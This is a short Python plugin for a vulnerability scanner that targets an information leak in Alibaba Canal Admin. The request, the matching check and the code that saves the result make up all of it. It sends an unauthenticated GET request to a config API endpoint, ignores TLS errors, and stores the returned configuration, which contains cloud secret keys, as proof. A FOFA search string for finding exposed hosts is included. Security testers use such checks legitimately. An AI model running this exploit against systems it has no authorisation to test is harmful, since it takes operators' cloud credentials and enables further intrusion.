#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://peiqi.wgpsec.org/wiki/webapp/AlibabaCanal/Alibaba Canal config 云密钥信息泄露漏洞.html',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'Alibaba canal config云密钥信息泄露',

      'level'     :   'high',

      'FOFA'      :   'title="Canal Admin"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/2/2',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/api/v1/canal/config/1/0'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'code.*?20000.*?name.*?canal.properties.*?status',res.text,re.S):
      ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret